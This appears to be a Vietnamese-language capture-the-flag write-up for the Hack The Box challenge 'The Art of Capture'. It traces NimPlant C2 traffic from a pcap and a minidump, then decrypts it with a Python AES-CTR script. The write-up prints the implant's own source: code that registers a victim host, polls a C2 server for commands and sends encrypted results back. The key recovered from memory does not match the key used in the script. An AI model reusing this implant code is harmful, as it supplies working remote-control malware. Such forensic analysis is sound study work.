Write-up: HTB — The Art of Capture

Challenge Scenario
I had a dream that my PC was captured by evil daemons. The next day, strange things started happening to it. There are two parts of the flag in this challenge.

Sau khi tải về chall cho mình 1 file dmp và 1 file pcap 

<img width="1892" height="296" alt="image" src="https://github.com/user-attachments/assets/660c1f2d-3673-4aed-92e3-eb92e3f947c8" />

Xem sơ qua file pcap , cụ thể là phần protocol thì thấy giao thức http có vấn đề, mình xem thử phần export object:

<img width="997" height="977" alt="image" src="https://github.com/user-attachments/assets/81aa88fd-21b3-48fe-9ee8-dd73b8e9b693" />

Mình xem thử packet http bất kì thì ở bên trong là phần payload đã bị mã hóa:

<img width="1877" height="935" alt="image" src="https://github.com/user-attachments/assets/582ff140-b11f-4aaf-80eb-177a2798314b" />

OK vậy giờ hướng giải quyết của chúng ta là decrypt traffic thông qua file dmp kia, file dmp là định dạng của 1 file mini dump crash report, tức là nó là 1 "screenshot" của 1 tiến trình bị crash tại 1 thời điểm nhất định, nó khác với file mem mà chúng ta thường hay gặp trong các thử thách DFIR vậy nên dùng volatility phân tích sẽ không khai thác được gì.

Vậy nên hướng giải quyết là dùng windbg , tiến hành load vào windbg thì chúng ta có thể biết đây là 1 mini dumo của DbgInfo.exe với lệnh !analyze

Mình dùng lệnh writement để trích cái process đó ra:

<img width="1026" height="332" alt="image" src="https://github.com/user-attachments/assets/ed4622e7-a347-4084-800d-196c256fba12" />

Load lên virustotal thì báo đỏ lè vậy nên chắc là malware rồi.

<img width="1852" height="977" alt="image" src="https://github.com/user-attachments/assets/8107be8f-00f5-4dc5-995d-d88826128c13" />

Trong phần details của virustotal thì có báo cáo của die là con malware này viết bằng nim , vậy nên ida và ghidra sẽ khó phân tích mã nguồn hơn, và thực tế là dúng như mình nghĩ load vào ida cũng kh thu được gì :)))

<img width="1855" height="593" alt="image" src="https://github.com/user-attachments/assets/84fa5cdd-f5b6-456a-a609-26f77ac109ba" />

Cụ thể là Nimplant : https://github.com/chvancooten/NimPlant/. Đây là các endpoint được xác định khi đối chiếu mã nguồn với traffic trong PCAP: 

Endpoint	    Vai trò theo luồng xử lý
/api/v2/login	Lấy ID và dữ liệu dùng để khởi tạo khóa
/api/v2/ping	Kiểm tra hoặc nhận task từ C2, tùy cấu hình taskPath
/api/v2/query	Gửi dữ liệu kết quả về C2, tùy cấu hình resultPath

Đây là các thành phần liên quan đến hoạt động của implant, đặc biệt là module webClient.nim. Trong mã nguồn của webClient.nim, hàm doRequest() xây dựng các HTTP request đến những endpoint được cấu hình sẵn như ở trên.

Các dấu hiệu này phù hợp với kiến trúc giao tiếp của NimPlant. Khi đối chiếu cả executable, mã nguồn và PCAP, do đó mình mới khẳng định mẫu đang phân tích có liên quan đến NimPlant và luồng giao tiếp với C2.

Đây là phần mã nguồn của module webClient.nim:

```
import base64, json, puppy
from strutils import split, toLowerAscii, replace
from unicode import toLower
from os import parseCmdLine
import crypto
import strenc

# Define the object with listener properties
type
    Listener* = object
        id* : string
        initialized* : bool
        registered* : bool
        listenerType* : string
        listenerHost* : string
        listenerIp* : string
        listenerPort* : string
        registerPath* : string
        sleepTime* : int
        sleepJitter* : float
        killDate* : string
        taskPath* : string
        resultPath* : string
        userAgent* : string
        cryptKey* : string

# HTTP request function
proc doRequest(li : Listener, path : string, postKey : string = "", postValue : string = "") : Response =
    try:
        # Determine target: Either "TYPE://HOST:PORT" or "TYPE://HOSTNAME"
        var target : string = toLowerAscii(li.listenerType) & "://"
        if li.listenerHost != "":
            target = target & li.listenerHost
        else:
            target = target & li.listenerIp & ":" & li.listenerPort
        target = target & path

        # GET request
        if (postKey == "" or postValue == ""):
            var headers: seq[Header]

            # Only send ID header once listener is registered
            if li.id != "":
                headers = @[
                        Header(key: "X-Identifier", value: li.id),
                        Header(key: "User-Agent", value: li.userAgent)
                    ]
            else:
                headers = @[
                        Header(key: "User-Agent", value: li.userAgent)
                    ]

            let req = Request(
                url: parseUrl(target),
                verb: "get",
                headers: headers,
                allowAnyHttpsCertificate: true,
                )

            return fetch(req)

        # POST request
        else:
            let req = Request(
                url: parseUrl(target),
                verb: "post",
                headers: @[
                    Header(key: "X-Identifier", value: li.id),
                    Header(key: "User-Agent", value: li.userAgent),
                    Header(key: "Content-Type", value: "application/json")
                    ],
                allowAnyHttpsCertificate: true,
                body: "{\"" & postKey & "\":\"" & postValue & "\"}"
                )
            return fetch(req)

    except:
        # Return a fictive error response to handle
        var errResponse = Response()
        errResponse.code = 500
        return errResponse

# Init NimPlant ID and cryptographic key via GET request to the registration path
# XOR-decrypt transmitted key with static value for initial exchange
proc init*(li: var Listener) : void =
    # Allow us to re-write the static XOR key used for pre-crypto operations
    const xor_key {.intdefine.}: int = 459457925

    var res = doRequest(li, li.registerPath)
    if res.code == 200:
        li.id = parseJson(res.body)["id"].getStr()
        li.cryptKey = xorString(base64.decode(parseJson(res.body)["k"].getStr()), xor_key)
        li.initialized = true
    else:
        li.initialized = false

# Initial registration function, including key init
proc postRegisterRequest*(li : var Listener, ipAddrInt : string, username : string, hostname : string, osBuild : string, pid : int, pname : string, riskyMode : bool) : void =
    # Once key is known, send a second request to register nimplant with initial info
    var data = %*
        [
            {
                "i": ipAddrInt,
                "u": username,
                "h": hostname,
                "o": osBuild,
                "p": pid,
                "P": pname,
                "r": riskyMode
            }
        ]
    var dataStr = ($data)[1..^2]
    let res = doRequest(li, li.registerPath, "data", encryptData(dataStr, li.cryptKey))

    if (res.code != 200):
        # Error at this point means XOR key mismatch, abort
        li.registered = false
    else:
        li.registered = true

type
  Command = object
    guid: string
    command: string
    args: seq[string]

# Watch for queued commands via GET request to the task path
proc getQueuedCommand*(li : Listener) : (string, string, seq[string]) =
    var 
        res = doRequest(li, li.taskPath)
        cmdGuid : string
        cmd : string
        args : seq[string]

    # A connection error occurred, likely team server has gone down or restart
    if res.code != 200:
        cmd = obf("NIMPLANT_CONNECTION_ERROR")

        when defined verbose:
            echo obf("DEBUG: Connection error, got status code: "), res.code

    # Otherwise, parse task and arguments (if any)
    else:
        try:
            # Attempt to parse task (parseJson() needs string literal... sigh)
            var responseData = decryptData(parseJson(res.body)["t"].getStr(), li.cryptKey) #.replace("\'", "\\\"")
            var parsedResponseData = parseJson(responseData)
            var jsonData = to(parsedResponseData, Command)


            # Get the task and task GUID from the response
            cmdGuid = jsonData.guid
            cmd = jsonData.command
            args = jsonData.args
        except:
            # No task has been returned
            cmdGuid = ""
            cmd = ""

    result = (cmdGuid, cmd, args)

# Return command results via POST request to the result path
proc postCommandResults*(li : Listener, cmdGuid : string, output : string) : void =
    var data = obf("{\"guid\": \"") & cmdGuid & obf("\", \"result\":\"") & base64.encode(output) & obf("\"}")
    discard doRequest(li, li.resultPath, "data", encryptData(data, li.cryptKey))

# Announce that the kill timer has expired
proc killSelf*(li : Listener) : void =
    if li.initialized:
        postCommandResults(li, "", obf("NIMPLANT_KILL_TIMER_EXPIRED"))
```

Sau đấy thì mình tìm hàm giải mã, cụ thể là ở module crypto.nim.

```

import nimcrypto, base64, random
from strutils import strip

# Calculate the XOR of a string with a certain key
# This function is explicitly intended for use for pre-key exchange crypto operations (decoding key)
proc xorString*(s: string, key: int): string {.noinline.} =
    var k = key
    result = s
    for i in 0 ..< result.len:
        for f in [0, 8, 16, 24]:
            result[i] = chr(uint8(result[i]) xor uint8((k shr f) and 0xFF))
        k = k +% 1

# XOR a string to a sequence of raw bytes
# This function is explicitly intended for use with the embedded config file (for evasion)
proc xorStringToByteSeq*(str: string, key: int): seq[byte] {.noinline.} =
    let length = str.len
    var k = key
    result = newSeq[byte](length)

    # Bitwise copy since we can't use 'copyMem' since it will be called at compile-time
    for i in 0 ..< result.len:
        result[i] = str[i].byte

    # Do the XOR
    for i in 0 ..< result.len:
        for f in [0, 8, 16, 24]:
            result[i] = uint8(result[i]) xor uint8((k shr f) and 0xFF)
        k = k +% 1

# XOR a raw byte sequence back to a string
proc xorByteSeqToString*(input: seq[byte], key: int): string {.noinline.} =
    let length = input.len
    var k = key

    # Since this proc is used at runtime, we can use 'copyMem'
    result = newString(length)
    copyMem(result[0].unsafeAddr, input[0].unsafeAddr, length)

    # Do the XOR and convert back to character
    for i in 0 ..< result.len:
        for f in [0, 8, 16, 24]:
            result[i] = chr(uint8(result[i]) xor uint8((k shr f) and 0xFF))
        k = k +% 1

# Get a random string
proc rndStr(len : int) : string =
    randomize()
    for _ in 0..(len-1):
        add(result, char(rand(int('A') .. int('z'))))

# Converts a string to the corresponding byte sequence.
# https://github.com/nim-lang/Nim/issues/14810
func convertToByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))

# Converts a byte sequence to the corresponding string.
func convertToString(bytes: openArray[byte]): string {.inline.} =
    let length = bytes.len
    if length > 0:
        result = newString(length)
        copyMem(result[0].unsafeAddr, bytes[0].unsafeAddr, length)

# Decrypt a blob of encrypted data with the given key
proc decryptData*(blob: string, key: string): string =
    let 
        blobBytes = convertToByteSeq(decode(blob))
        iv = blobBytes[0 .. 15]
    var
        enc = newSeq[byte](blobBytes.len)
        dec = newSeq[byte](blobBytes.len)   
        keyBytes = convertToByteSeq(key)
        dctx: CTR[aes128]

    enc = blobBytes[16 .. ^1]
    dctx.init(keyBytes, iv)
    dctx.decrypt(enc, dec)
    dctx.clear()
    result = convertToString(dec).strip(leading=false, chars={'\0'})

# Encrypt a input string with the given key
proc encryptData*(data: string, key: string): string =
    let 
        dataBytes : seq[byte] = convertToByteSeq(data)
    var
        iv: string = rndStr(16)
        enc = newSeq[byte](len(dataBytes))
        dec = newSeq[byte](len(dataBytes))   
    dec = dataBytes
    var dctx: CTR[aes128]
    dctx.init(key, iv)
    dctx.encrypt(dec, enc)
    dctx.clear()
    result = encode(convertToByteSeq(iv) & enc)

```
Phân tích module crypto của NimPlant cho thấy dữ liệu C2 được mã hóa bằng AES-128 ở chế độ CTR. Hàm decryptData() giải mã Base64, tách 16 byte đầu làm IV và sử dụng phần còn lại làm ciphertext. Trong khi đó, xorString() xử lý giá trị khóa nhận được từ bước đăng ký C2 để tạo cryptKey. 

Giờ chúng ta tìm session key trong ram và mình tìm được key là :kVUboRSaneIPXWg1 

Tiếp đến là phân tích giao thức C2 trong pcap: C2 nói chuyện bằng HTTP và JSON trên cổng 4444, và chỉ có ba endpoint cần quan tâm: /api/v2/login, /api/v2/ping và /api/v2/query. Dữ liệu có ích nằm ở query, vì các body lớn đều đi qua đó.

Mình tiến hành trích payload bằng tshark với lệnh bash : tshark -r capture.pcapng -Y "http.file_data" -T fields -e frame.number -e frame.time_relative -e http.request.method -e http.request.uri -e http.file_data | Out-File -Encoding ascii http_payloads.txt

<img width="1885" height="866" alt="image" src="https://github.com/user-attachments/assets/70980ede-4432-4d84-ad24-7fbf5df7d4c6" />

Sau đấy mình viết script decrypt payload:
```
import base64, gzip, json, re
from Crypto.Cipher import AES
from Crypto.Util import Counter

KEY = b"ZjLtHquGbCxfsnoS"

def decrypt(b64: str) -> bytes:
    raw = base64.b64decode(b64)
    iv, ct = raw[:16], raw[16:]
    ctr = Counter.new(128, initial_value=int.from_bytes(iv, "big"))
    pt = AES.new(KEY, AES.MODE_CTR, counter=ctr).decrypt(ct)
    return gzip.decompress(pt) if pt[:2] == b"\x1f\x8b" else pt

def sniff_ext(b: bytes) -> str:
    if b[:4] == b"\x89PNG": return ".png"
    if b[:2] == b"MZ":      return ".exe"
    if b[:2] == b"\x1f\x8b": return ".gz"
    return ".bin"

for line in open("http_payloads.txt", encoding="utf-16"):
    parts = re.split(r"[\t$]", line.rstrip("\n"), maxsplit=4)
    if len(parts) < 5 or not parts[4]:
        continue
    frame, _, method, uri, hex_body = parts
    try:
        body = json.loads(bytes.fromhex(hex_body))
    except Exception:
        continue
    print(f"\n=== Frame {frame} {method or 'RESP'} {uri}")
    for k in ("data", "t"):
        if k not in body:
            continue
        pt = decrypt(body[k])
        try:
            j = json.loads(pt.replace(b"'", b'"'))   
        except Exception:
            print(f"  [{k}] {len(pt)} bytes, head={pt[:60]!r}")
            open(f"frame{frame}{sniff_ext(pt)}", "wb").write(pt)
            continue
        print(f"  [{k}] {j}")
        res = j.get("result") if isinstance(j, dict) else None
        if isinstance(res, str):
            try:
                inner = base64.b64decode(res)
                if inner[:2] == b"\x1f\x8b":
                    inner = gzip.decompress(inner)
                name = f"frame{frame}_result{sniff_ext(inner)}"
                open(name, "wb").write(inner)
                print(f"    result -> {name} ({len(inner)} bytes) head={inner[:40]!r}")
            except Exception as e:
                print("    result decode error:", e)
```
Mình thu được output như sau:


<img width="1912" height="887" alt="image" src="https://github.com/user-attachments/assets/41d8ca60-6dc0-478f-b18a-d72902cf76fe" />


Đến đây mình để ý tới 2 phần , 1 phần là screenshot và 1 cái còn lại là kẻ tấn công đã upload lên 1 file là rev.exe









